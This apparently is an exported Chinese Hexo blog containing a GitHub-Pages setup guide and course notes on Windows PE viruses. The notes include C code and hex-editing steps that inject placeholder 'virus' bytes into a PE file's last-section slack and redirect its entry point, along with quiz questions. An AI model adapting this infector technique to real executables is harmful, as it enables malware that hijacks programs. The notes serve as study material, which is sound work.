<p><code>https://registry.npmjs.org/</code>为官方源地址</p>
<p><code>https://registry.npm.taobao.org/</code>为淘宝源地址</p>
</li>
</ol>
<h2 id="下载hexo并创建本地的静态博客"><a class="markdownIt-Anchor" href="#下载hexo并创建本地的静态博客"></a> 下载hexo并创建本地的静态博客</h2>
<ol>
<li><code>cnpm install -g hexo-cli</code>安装hexo</li>
<li><code>hexo -v</code>查看hexo版本</li>
<li>然后创建一个你存博客的目录并进入到该目录<br />
<code>mkdir blog</code><br />
<code>cd blog</code></li>
<li>使用<code>hexo init</code>在当前目录下生成博客的框架</li>
<li>使用<code>hexo s</code>开启博客，进入<code>http://localhost:4000/</code>查看本地博客内容</li>
<li>使用<code>hexo n &quot;文章名&quot;</code>创建新的文章，然后找到在<code>/source/_post</code>目录下找到文章编辑即可，使用markdown语法，<a href="https://www.runoob.com/markdown/md-tutorial.html">markdown语法参考</a>，很简单，一会就能学会，你也可以下一款markdown编辑器，我用的<a href="https://typora.io/">typora</a></li>
</ol>
<h2 id="部署到github上"><a class="markdownIt-Anchor" href="#部署到github上"></a> 部署到GitHub上</h2>
<ol>
<li>在你的GitHub上新建一个仓库，命名为<code>YourGithubName.github.io</code></li>
<li>然后<code>cnpm install --save hexo-deployer-git</code>在blog目录下安装git部署插件</li>
<li>下面配置_config.yml</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line">deploy:</span><br><span class="line"> 		<span class="built_in">type</span>: git</span><br><span class="line">		repo: https://github.com/YourGithubName/YourGithubName.github.io.git</span><br><span class="line"> 		branch: master</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>
<p>最后运行以下三条命令：<br />
<code>hexo clean</code>清理<br />
<code>hexo g</code>生成<br />
<code>hexo d</code>部署</p>
<p>以上三条命令基本是每次修改博客后都要运行的</p>
</li>
<li>
<p>最后在<code>https://YourGithubName.github.io</code>下就可以查看啦！</p>
</li>
<li>
<p>注意浏览器可能会有缓存导致生效比较慢，每次更新后可<code>shift+F5</code>强制刷新并多等会</p>
</li>
</ol>
<hr />
<h2 id="主题的更换"><a class="markdownIt-Anchor" href="#主题的更换"></a> 主题的更换</h2>
<p>更改主题一般分三步：</p>
<ol>
<li><code>git clone https://github.com/theme-next/hexo-theme-next themes/next</code>利用git将别人仓库里的主题克隆到自己的blog下的themes文件夹里</li>
<li>修改blog目录下的 _config.yml 文件中的  theme改为theme: next</li>
<li>更改完成，运行<code>hexo clean&amp;&amp;hexo g&amp;&amp;hexo d</code>就可以看到变化啦</li>
</ol>
<h2 id="其他资料"><a class="markdownIt-Anchor" href="#其他资料"></a> 其他资料</h2>
<p>关于主题的美化和一些其他配置，博主小丁的博客里介绍的非常详细，我也是根据他的博客一步步来的，他的<a href="https://tding.top">博客地址</a></p>
<h2 id="参考文献"><a class="markdownIt-Anchor" href="#参考文献"></a> 参考文献</h2>
<ol>
<li><a href="https://www.bilibili.com/video/BV1Yb411a7ty">b站大佬视频讲解</a></li>
<li><a href="https://543877815.github.io">逗比学长的博客</a></li>
</ol>
]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>自学</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>病毒_Win_末节寄生程序设计</title>
    <url>/archives/3ac768f6.html</url>
    <content><![CDATA[<h2 id="末节大小不变的寄生"><a class="markdownIt-Anchor" href="#末节大小不变的寄生"></a> 末节大小不变的寄生</h2>
<h3 id="需要修改的地方"><a class="markdownIt-Anchor" href="#需要修改的地方"></a> 需要修改的地方</h3>
<ol>
<li>填写eb 02 90 90机器码（病毒机器码）</li>
<li>修改AddressOfEntryPoint</li>
<li>修改节的VirtualSize</li>
<li>节的SizeOfRawData不需要修改</li>
<li>可选映像头SizeOfImage</li>
</ol>
<span id="more"></span>
<h3 id="程序设计"><a class="markdownIt-Anchor" href="#程序设计"></a> 程序设计</h3>
<p><img src="/images/%E7%97%85%E6%AF%92-Win-%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20210519091939767.png" alt="image-20210519091939767" /></p>
<h3 id="具体代码"><a class="markdownIt-Anchor" href="#具体代码"></a> 具体代码</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="comment">// 4个字节，放病毒代码 EB 02 09 09</span></span><br><span class="line"><span class="keyword">char</span> code[<span class="number">4</span>];</span><br><span class="line"><span class="comment">//DOS头字段e_lfanew字段偏移0x3c</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> OFFSET_OPTHDR_START 0x3c   </span></span><br><span class="line"><span class="comment">//变量ntHdrs  PE文件头（NT头）</span></span><br><span class="line">IMAGE_NT_HEADERS ntHdrs;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数将文件指针定位到NT头</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">locateNTHdrStart</span><span class="params">(FILE * fp)</span>   	 </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> hdrStart;    		<span class="comment">//4个字节，放NT头的偏移量</span></span><br><span class="line">	fseek(fp, OFFSET_OPTHDR_START, SEEK_SET); 	<span class="comment">//定位到e_lfanew字段，0x3c位置</span></span><br><span class="line">	fread(&amp;hdrStart, <span class="keyword">sizeof</span>(hdrStart), <span class="number">1</span>, fp); 		<span class="comment">//读e_lfanew的值到hdrStart</span></span><br><span class="line">	fseek(fp, hdrStart, SEEK_SET);               		<span class="comment">//定位到NT头</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数读入整个NT头</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readHdrs</span><span class="params">(FILE * fp)</span>            		 </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	locateNTHdrStart(fp);</span><br><span class="line">	fread(&amp;ntHdrs, <span class="keyword">sizeof</span>(ntHdrs), <span class="number">1</span>, fp);  	<span class="comment">//取出一个PE头大小的数据到ntHdrs</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数生成寄生的病毒代码 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	code[<span class="number">0</span>] = <span class="number">0xEB</span>;</span><br><span class="line">	code[<span class="number">1</span>] = <span class="number">0x02</span>;</span><br><span class="line">	code[<span class="number">2</span>] = <span class="number">0x90</span>;</span><br><span class="line">	code[<span class="number">3</span>] = <span class="number">0x90</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获得病毒代码以及读文件NT头的主函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argC, <span class="keyword">char</span> ** args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获得病毒代码</span></span><br><span class="line">getCode();  	</span><br><span class="line"><span class="comment">//打开命令行参数args[1]给出的文件</span></span><br><span class="line">FILE * fp;    	</span><br><span class="line">fp = fopen(args[<span class="number">1</span>], “rb+”);   </span><br><span class="line"><span class="comment">//读入文件的NT头</span></span><br><span class="line">readHdrs(fp);      	</span><br><span class="line">&#125;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"><span class="comment">//以下代码为找到最后一个节并判断是否有空洞，此时文件指针正好指向节表项起始的位置</span></span><br><span class="line">	<span class="comment">// 获得节的数量</span></span><br><span class="line">	<span class="keyword">int</span> sectionNum = ntHdrs.FileHeader.NumberOfSections;   <span class="comment">//映像文件头中获得节的总数量</span></span><br><span class="line">	<span class="comment">// 定位到最后一个节表项</span></span><br><span class="line">	fseek(fp, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER) * (sectionNum - <span class="number">1</span>), SEEK_CUR); 	IMAGE_SECTION_HEADER lastSectionHdr;   	<span class="comment">//winnt.h给出了节表项的结构体</span></span><br><span class="line">	fread(&amp;lastSectionHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);	    <span class="comment">//读入最后节的节表项</span></span><br><span class="line">	<span class="comment">// 判断最后一节是否有寄生的空洞</span></span><br><span class="line">	<span class="keyword">if</span> (lastSectionHdr.SizeOfRawData - lastSectionHdr.Misc.VirtualSize &lt; <span class="number">4</span>)</span><br><span class="line">	&#123;	<span class="comment">//如果最后段的填充部分不够寄生代码的长度，无法寄生，就退出不感染</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;the last section has not enough space to save virus\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改最后一个节的VirtualSize，在最后一个节写入寄生的病毒代码</span></span><br><span class="line">	<span class="comment">//修改最后节的VirtualSize</span></span><br><span class="line">	 <span class="comment">//之前读了最后一个节表项，重新定位回去</span></span><br><span class="line">	fseek(fp, - <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), SEEK_CUR);  </span><br><span class="line">	 <span class="comment">//后移8个字节跳过name字段，定位到VirtualSize字段</span></span><br><span class="line">	fseek(fp, <span class="number">8</span>, SEEK_CUR);		</span><br><span class="line">	<span class="keyword">int</span> newVirtualSize = lastSectionHdr.Misc.VirtualSize + <span class="number">4</span>;    <span class="comment">//计算新的VirtualSize的值</span></span><br><span class="line">	fwrite(&amp;newVirtualSize, <span class="keyword">sizeof</span>(newVirtualSize), <span class="number">1</span>, fp);	    <span class="comment">//写入新VirutalSize值到文件中</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//写入寄生代码</span></span><br><span class="line">	<span class="comment">//寄生位置：最后一个节的起始位置PointerToRawData + 原来的VirtualSize</span></span><br><span class="line">	fseek(fp, lastSectionHdr.PointerToRawData + lastSectionHdr.Misc.VirtualSize , SEEK_SET);</span><br><span class="line">	fwrite(code, <span class="number">4</span>, <span class="number">1</span>, fp);		<span class="comment">//写4字节的寄生代码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改SizeOfImage和EntryPoint</span></span><br><span class="line"><span class="comment">//1. 获取AddressOfEntry和SizeOfImage字段到NT头的偏移量</span></span><br><span class="line"><span class="keyword">int</span> offsetEntry = (<span class="keyword">int</span>)&amp;((IMAGE_NT_HEADERS *)<span class="number">0</span> )-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line"><span class="keyword">int</span> offsetImageSize = (<span class="keyword">int</span>)&amp;((IMAGE_NT_HEADERS *)<span class="number">0</span> )-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 修改SizeOfImage  （文件指针在NT头）</span></span><br><span class="line">locateNTHdrStart(fp);                      <span class="comment">//重新定位到NT头</span></span><br><span class="line">fseek(fp, offsetImageSize, SEEK_CUR);                    <span class="comment">// 定位到字段SizeOfImage</span></span><br><span class="line"><span class="comment">//  ( RVA + VirtualSize + 4  /  SectionAlignment ) 向上取整</span></span><br><span class="line"><span class="keyword">int</span> accurateSize = (lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize + <span class="number">4</span>); </span><br><span class="line"><span class="keyword">int</span> pageNum = accurateSize  / ntHdrs.OptionalHeader.SectionAlignment;   </span><br><span class="line"><span class="keyword">int</span> imageSize = (pageNum) * ntHdrs.OptionalHeader.SectionAlignment &lt; accurateSize ? </span><br><span class="line">                   (pageNum + <span class="number">1</span>) * ntHdrs.OptionalHeader.SectionAlignment : accurateSize;   <span class="comment">//取上整</span></span><br><span class="line"><span class="comment">// 写入新的SizeOfImage值</span></span><br><span class="line">fwrite(&amp;imageSize, <span class="keyword">sizeof</span>(imageSize), <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 修改入口点AddressOfEntryPoint</span></span><br><span class="line">locateNTHdrStart(fp);		<span class="comment">//重新定位文件指针到NT头</span></span><br><span class="line">fseek(fp, offsetEntry, SEEK_CUR);	<span class="comment">//定位到AdressOfEntryPoint字段</span></span><br><span class="line"><span class="comment">// 新的入口RVA = 最后节的起始RVA + 最后节原来的VirtualSize，这样就指向寄生代码起始了</span></span><br><span class="line"><span class="keyword">int</span> entry = lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize;</span><br><span class="line">fwrite(&amp;entry, <span class="keyword">sizeof</span>(entry), <span class="number">1</span>, fp);	<span class="comment">//写新的入口RVA</span></span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure>
<h3 id="返回原始程序"><a class="markdownIt-Anchor" href="#返回原始程序"></a> 返回原始程序</h3>
<p>在病毒代码最后增加JMP xx xx xx xx</p>
<p>位移量如何计算？</p>
<p><img src="/images/%E7%97%85%E6%AF%92-Win-%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20210519093251556.png" alt="image-20210519093251556" /></p>
<h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3>
<ol>
<li>将病毒寄生在末节空洞的程序设计中，下列说法不正确的是（       ）<br />
A.  &lt;windows.h&gt;和&lt;winnt.h&gt;提供了PE文件头相关的结构体定义<br />
B.  病毒程序想访问AddressOfEntryPoint时，可以先将NT头信息由文件读到相应的结构体变量中<br />
C.  病毒程序需要生成寄生到原文件的病毒代码<br />
D.  寄生完成后，病毒程序需要修改结构体变量中的成员virtualSize和imageSize来确保寄生的病毒代码被加载到内存</li>
</ol>
<p>参考答案：D</p>
<p>解析：病毒程序没有修改结构体变量中的成员，而是直接更改文件</p>
]]></content>
      <categories>
        <category>病毒</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>病毒_Win_PE结构和末节寄生</title>
    <url>/archives/20191e8a.html</url>
    <content><![CDATA[<h2 id="pe格式"><a class="markdownIt-Anchor" href="#pe格式"></a> PE格式</h2>
<p>在Win32位平台可执行文件命名为可移植的可执行文件（Portable Executable File），该文件的格式就是PE格式</p>
<p>在Win32系统中，常见的EXE，DLL，SYS，COM等可执行文件都是PE文件</p>
<span id="more"></span>
<h3 id="图示"><a class="markdownIt-Anchor" href="#图示"></a> 图示</h3>
<p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210517151959406.png" alt="image-20210517151959406" /></p>
<h3 id="映像"><a class="markdownIt-Anchor" href="#映像"></a> 映像</h3>
<ol>
<li>PE文件的加载要完成虚拟地址（内存）和PE文件（硬盘）之间的映射关系，所以又被称为映像文件</li>
<li>当真正执行某个内存页的指令或访问一个页的数据时，这个页面才会真正读入内存</li>
<li>所以文件装入速度与文件大小关系不大</li>
<li>注意区分文件位置与虚拟地址与相对虚拟地址</li>
</ol>
<h3 id="相对虚拟地址rva"><a class="markdownIt-Anchor" href="#相对虚拟地址rva"></a> 相对虚拟地址（RVA）</h3>
<ol>
<li>
<p>虚拟地址，即我们前面提到的逻辑地址，指的是内存中的地址（注意和硬盘上文件中的位置相区分）</p>
</li>
<li>
<p>相对地址，即相对PE文件加载到内存后占用的最开始的那个内存单元的逻辑地址（基地址）</p>
</li>
<li>
<p>区分RVA和FOA</p>
<blockquote>
<p>RVA：内存中的相对位置，相对的是加载到内存的基地址</p>
<p>FOA：文件中的相对位置，相对的是文件的开始位置（即0）</p>
<p>在文件中，一个节往往按512B（200H）的粒度对齐</p>
<p>在内存中，一个节通常按4096（1000H）的粒度对齐</p>
<p>所以内存的RVA和文件的FOA通常是不一致的</p>
<p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210517153940694.png" alt="image-20210517153940694" /></p>
<p>（由于装载时前面的一般不动，DOS部分、PE文件头部分、节表部分、和第一个节的RVA和FOA通常一致）</p>
</blockquote>
</li>
<li>
<p>图示</p>
<blockquote>
<p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210517153120815.png" alt="image-20210517153120815" /></p>
<p>在图示中，基地址是0x00400000，.text节的RVA是0x1560，VA是0x00401560</p>
</blockquote>
</li>
</ol>
<h3 id="dos头部分"><a class="markdownIt-Anchor" href="#dos头部分"></a> DOS头部分</h3>
<p>图示，仅供参考无需记忆：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210517154415235.png" alt="image-20210517154415235" /></p>
<p>头部的e_magic，就是两个字符MZ，代表DOS文件<br />
最后一个字段e_lfanew是偏移量，就是文件开始到PE文件头（NT头）的偏移量</p>
<h3 id="pe头"><a class="markdownIt-Anchor" href="#pe头"></a> PE头</h3>
<p>包含3个部分</p>
<ol>
<li>PE文件标志（Signature）</li>
<li>映像文件头（IMAGE_FILE_HEADER）</li>
<li>可选映像文件头（IMAGE_OPTIONAL_HEADER32）</li>
</ol>
<h4 id="pe文件标志"><a class="markdownIt-Anchor" href="#pe文件标志"></a> PE文件标志</h4>
<p>两个字节为PE表明是PE格式文件</p>
<p>故而判断文件是否为PE格式可以通过：</p>
<ol>
<li>先判断文件头2个字节是否为MZ</li>
<li>判断NT头（PE头）的Signature是否为PE</li>
</ol>
<h4 id="映像文件头"><a class="markdownIt-Anchor" href="#映像文件头"></a> 映像文件头</h4>
<p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210517155329619.png" alt="image-20210517155329619" /></p>
<p>对病毒来说，可能需要用到NumberOfSections</p>
<h4 id="可选映像头"><a class="markdownIt-Anchor" href="#可选映像头"></a> 可选映像头</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Option Header </span><br><span class="line">TImage_Optional_Header32 = record</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    Magic: Word;</span><br><span class="line">    MajorLinkerVersion: Byte;</span><br><span class="line">    MinorLinkerVersion: Byte;</span><br><span class="line">    SizeOfCode: Cardinal;</span><br><span class="line">    SizeOfInitializedData: Cardinal;</span><br><span class="line">    SizeOfUninitializedData: Cardinal;</span><br><span class="line">    AddressOfEntryPoint: Cardinal;         <span class="comment">//代码入口RVA，第一条指令的RAV</span></span><br><span class="line">    BaseOfCode: Cardinal;</span><br><span class="line">    BaseOfData: Cardinal;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    ImageBase: Cardinal;			<span class="comment">//载入程序的首选RAV</span></span><br><span class="line">    SectionAlignment: Cardinal;		<span class="comment">//节在内存中对齐方式</span></span><br><span class="line">    FileAlignment: Cardinal;			<span class="comment">//节在文件中对齐方式</span></span><br><span class="line">    MajorOperatingSystemVersion: Word;</span><br><span class="line">    MinorOperatingSystemVersion: Word;</span><br><span class="line">    MajorImageVersion: Word;</span><br><span class="line">    MinorImageVersion: Word;</span><br><span class="line">    MajorSubsystemVersion: Word;</span><br><span class="line">    MinorSubsystemVersion: Word;</span><br><span class="line">    Win32VersionValue: Cardinal;</span><br><span class="line">    SizeOfImage: Cardinal;	       <span class="comment">//内存中整个PE文件的总大小，按内存对齐</span></span><br><span class="line">    SizeOfHeaders: Cardinal;	</span><br><span class="line">    CheckSum: Cardinal;</span><br><span class="line">    Subsystem: Word;</span><br><span class="line">    DllCharacteristics: Word;</span><br><span class="line">    SizeOfStackReserve: Cardinal;</span><br><span class="line">    SizeOfStackCommit: Cardinal;</span><br><span class="line">    SizeOfHeapReserve: Cardinal;</span><br><span class="line">    SizeOfHeapCommit: Cardinal;</span><br><span class="line">    LoaderFlags: Cardinal;</span><br><span class="line">    NumberOfRvaAndSizes: Cardinal;		<span class="comment">//数据目录的项数</span></span><br><span class="line">    DataDirectory: <span class="built_in">array</span>[<span class="number">0.</span>.IMAGE_NUMBEROF_DIRECTORY_ENTRIES - <span class="number">1</span>] of        </span><br><span class="line">                                                               TImage_Data_Directory;	<span class="comment">//数据目录表</span></span><br><span class="line">  end;</span><br></pre></td></tr></table></figure>
<p>上述注释为可能用到的字段，<strong>“AddressOfEntryPoint”很关键</strong></p>
<h2 id="利用入口rva实现病毒执行"><a class="markdownIt-Anchor" href="#利用入口rva实现病毒执行"></a> 利用入口RVA实现病毒执行</h2>
<h3 id="修改入口地址对应指令"><a class="markdownIt-Anchor" href="#修改入口地址对应指令"></a> 修改入口地址对应指令</h3>
<ol>
<li>
<p>用PEView定位到AddressOfEntryPoint</p>
</li>
<li>
<p>用UE定位到AddressOfEntryPoint的值位置（注意值是RVA）</p>
</li>
<li>
<p>通过RVA找到文件的FOA</p>
<blockquote>
<p>入口点的RVA（AddressOfEntryPoint）- 节的RVA =</p>
<p>入口点的FOA - 节的起始文件位置（PointerToRawData）</p>
</blockquote>
</li>
<li>
<p>用eb 02 90 90替代原来内容，该指令汇编为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jmp aa</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">aa:</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>用OD启动修改后程序，OD将停在第一条指令，观察第一条指令是eb 02 90 90</p>
</li>
<li>
<p>成功</p>
</li>
<li>
<p>注：程序的ImageBase+AddressOfEntryPoint就是入口点地址</p>
</li>
</ol>
<h3 id="直接修改入口点地址"><a class="markdownIt-Anchor" href="#直接修改入口点地址"></a> 直接修改入口点地址</h3>
<ol>
<li>找到AddressOfEntryPoint字段在文件中的偏移</li>
<li>用UE修改就好</li>
</ol>
<h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3>
<ol>
<li>下列哪个字段不在PE文件的可选头中（    ）<br />
A．入口点地址<br />
B．文件对齐大小<br />
C．子系统<br />
D．节表</li>
</ol>
<p>参考答案：D</p>
<p>解析：由前面的图知道，节表是在PE文件头后面的</p>
<h2 id="病毒加载到内存的问题"><a class="markdownIt-Anchor" href="#病毒加载到内存的问题"></a> 病毒加载到内存的问题</h2>
<h3 id="节表"><a class="markdownIt-Anchor" href="#节表"></a> 节表</h3>
<ol>
<li>节表紧跟在PE文件头后面，节表中每一个结构ImageSectionHeader（28H）都对应一个节，其中，SizeOfRawData描述了对应节的文件大小，VirtualSize描述了加载到内存的大小（两者可能不同，文件大小可以大于也可以小于内存大小，小于时将在内存补0）</li>
<li>在PE文件头的可选映像头中，SizeOfImage给出了整个程序包括所有头部加载到内存后的大小，其大小是SectionAlignment的整数倍（SectionAlignment是内存对齐的粒度、FileAlignment是文件对齐的粒度）</li>
<li>简单说，就是PE文件总大小和每个节的大小都有参数</li>
</ol>
<p>图示：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210519083535334.png" alt="image-20210519083535334" /></p>
<h2 id="末节寄生"><a class="markdownIt-Anchor" href="#末节寄生"></a> 末节寄生</h2>
<h3 id="思想"><a class="markdownIt-Anchor" href="#思想"></a> 思想</h3>
<ol>
<li>如果该节内存大小&lt;文件大小，我们就在文件中将指令加载到该节的多余部分（对齐后的空洞）</li>
<li>然后修改节表SectionHeader中的VirtualSize字段（加载到内存的字节数）为修改后的大小，而对齐后的文件大小SizeOfRowData保持不变</li>
<li>注意，有时exe最后一个字节后有一些调试信息，但它不会被加载到内存，这也许就是SizeOfImage的意义，它阻止尾部多余信息进入内存</li>
</ol>
<h3 id="具体操作"><a class="markdownIt-Anchor" href="#具体操作"></a> 具体操作</h3>
<ol>
<li>首先找到最后一个节在文件中的位置，即其节表项中PointerToRawData字段</li>
<li>找到节中的寄生位置，就是VirtualSize字段后面</li>
<li>找到在文件中的寄生位置，PointerToRawData+VirtualSize</li>
<li>用UE在文件偏移到该处进行修改</li>
<li>修改最后一个节表中的VirtualSize</li>
<li>计算SizeOfImage=程序大小/SectionOfImage并向上取整，查看是否需要修改</li>
<li>修改AddressOfEntryPoint为新的程序入口RVA</li>
</ol>
<h3 id="文件长度变大"><a class="markdownIt-Anchor" href="#文件长度变大"></a> 文件长度变大</h3>
<ol>
<li>在reloc节原VirutalSize后添加JMP xx xx，在DOS部分已知机器码偏移量为两字节E9 xx xx</li>
<li>在reloc节后添加两个NOP指令</li>
<li>修改reloc节头的SizeOfRawData，加一个FileAlignment（1000h），为2000h</li>
<li>修改reloc节头的VirtualSize为原SizeOfRawData+2(两个nop) ，现在NOP才是实际结尾</li>
<li>修改可选映像头的SizeOfImage = (relocRVA+新VirutalSize)除以SectionAlign取上整</li>
<li>在NOP后手动增加1000h-2个字节，内容不论，为对齐后填充内容，以前是编译器自动填充</li>
<li>修改入口点RAV（AddressOfEntryPoint）</li>
</ol>
<p>图示：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210519085921966.png" alt="image-20210519085921966" /></p>
<h3 id="例题-2"><a class="markdownIt-Anchor" href="#例题-2"></a> 例题</h3>
<ol>
<li>关于PE文件病毒，下列说法不正确的是（       ）<br />
A. 需要对PE文件头的某些字段进行修改，保证感染后的PE文件合法<br />
B. PE文件感染必然会增加PE文件的大小<br />
C. 病毒可以通过修改PE文件入口点的值或者入口点处的指令来获得执行机会<br />
D. 病毒可以将自身且分为多段，分别插入到PE文件各节的空洞中</li>
</ol>
<p>参考答案：B</p>
<p>解析：PE文件感染有的方式是不改变PE文件大小的</p>
]]></content>
      <categories>
        <category>病毒</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>病毒_Win_虚拟地址</title>
    <url>/archives/c7304b6b.html</url>
    <content><![CDATA[<h2 id="ollydebug简介"><a class="markdownIt-Anchor" href="#ollydebug简介"></a> OllyDebug简介</h2>
<p>Windows下用户级调试神器——OllyDebug，简称OD</p>
<p>OD是强大的动态追踪工具，具有可视化操作界面，但是非常占内存</p>
<span id="more"></span>
<h3 id="基本功能"><a class="markdownIt-Anchor" href="#基本功能"></a> 基本功能</h3>
<ol>
<li>启动一个程序调试</li>
<li>Attach到一个已经运行的程序调试</li>
<li>单步，step into and step over</li>
<li>断点</li>
<li>继续运行</li>
<li>查看内存</li>
<li>修改内存</li>
<li>查看寄存器</li>
<li>修改寄存器</li>
<li>代码窗体跳到指定地址</li>
<li>修改指令</li>
<li>查看一个进程加载的dll</li>
<li>查看dll中有哪些函数</li>
<li>查找内存中的某个值</li>
</ol>
<h3 id="动态链接库dll"><a class="markdownIt-Anchor" href="#动态链接库dll"></a> 动态链接库DLL</h3>
<p>DLL（Dynamic Link Libraries）使得更新和重用程序更加方便</p>
<ol>
<li>是程序的一部分，作为模块被进程加载到自己的空间地址</li>
<li>在编译时不会插入可执行文件中，在运行时整个库的代码才会调入内存，这就是所谓的“动态链接”</li>
</ol>
<p>一些重要的动态链接库：</p>
<blockquote>
<p>Windows中有几个非常重要的底层DLL：Kernel32.dll、User32.dll、GDI32.dll、ntdll.dll</p>
<ol>
<li>Kernel32.dll顾名思义就是内核相关的功能，主要包含用于管理内存、进程和线程的函数</li>
<li>User32.dll中包含的则是用于执行用户界面的函数，比如把用户的鼠标点击操作传递给窗口，以便窗口根据用户的点击来执行预定的事件</li>
<li>GDI32.dll的名称用了缩写，全称是Graphical Device Interface（图形设备接口），包含用于画图和显示文本的函数，比如要显示一个程序窗口，就调用了其中的函数来画这个窗口</li>
<li>ntdll.dll是Windows系统从ring3到ring0的入口。位于Kernel32.dll和user32.dll中的所有win32 API最终都是调用ntdll.dll中的函数实现的</li>
</ol>
</blockquote>
<h2 id="windows内存管理和程序加载"><a class="markdownIt-Anchor" href="#windows内存管理和程序加载"></a> Windows内存管理和程序加载</h2>
<h3 id="保护模式内存管理"><a class="markdownIt-Anchor" href="#保护模式内存管理"></a> 保护模式内存管理</h3>
<ol>
<li>DOS的内存管理是实模式，我们可以随意改动甚至系统的内存（比如修改中断向量表）</li>
<li>Windows是工作在x86的保护模式。每个进程都有自己独立的线性地址空间（0-4GB，32位CPU的寻址能力是2^32=4GB），互不干扰，这4GB空间会按某个固定大小（如4KB）分成N个页</li>
<li>同时，内存又分为用户空间和内核空间，用户空间代码无法直接访问内核空间</li>
<li>其能防止应用程序非法访问其他应用程序的地址空间（任务间保护），防止应用程序非法访问操作系统地址空间（系统保护）</li>
</ol>
<h3 id="一个小实验"><a class="markdownIt-Anchor" href="#一个小实验"></a> 一个小实验</h3>
